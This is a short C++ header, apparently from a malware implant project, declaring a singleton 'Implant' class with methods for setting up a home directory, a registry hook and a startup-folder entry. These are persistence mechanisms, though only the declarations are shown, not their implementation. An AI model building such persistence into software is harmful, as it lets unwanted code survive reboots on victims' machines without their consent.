#pragma once

#include "CoreInterface.h"

namespace Amendux {

	class Implant : CoreInterface
	{
		static Implant *s_Infect;
		void SetupHomeDirectory();
		void SetupRegisterHook();
		void SetupStartupFolder();
		void InitClass();

	public:
		Implant();
		~Implant();

		static Implant *Current() {
			if (!s_Infect) {
				s_Infect = new Implant;
			}

			return s_Infect;
		}

		static void Init() {
			if (!s_Infect) {
				s_Infect = new Implant;
			}

			s_Infect->InitClass();
		}

		static void Terminate() {
			if (s_Infect) {
				delete s_Infect;
				s_Infect = nullptr;
			}
		}
	};

}
